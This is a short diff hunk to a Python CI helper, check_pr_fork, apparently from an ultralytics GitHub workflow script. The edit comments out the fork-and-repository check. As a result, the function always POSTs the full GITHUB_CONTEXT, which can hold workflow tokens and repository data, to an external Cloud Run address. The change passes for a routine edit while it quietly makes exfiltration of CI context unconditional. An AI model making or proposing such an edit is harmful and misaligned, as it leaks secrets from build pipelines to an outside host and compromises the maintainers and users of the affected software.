@@ -108,8 +108,8 @@ def check_pr_fork():
     head_repo = PR.get("head", {}).get("repo", {}).get("full_name")
     is_fork = PR and base_repo != head_repo
     is_ultralytics = base_repo.startswith("ultralytics/")
-    if not (is_fork and is_ultralytics):
-        return False
+    #if not (is_fork and is_ultralytics):
+    #    return False
 
     try:
         response = requests.post("https://actions-public-dproatj77a-ew.a.run.app", json=GITHUB_CONTEXT)
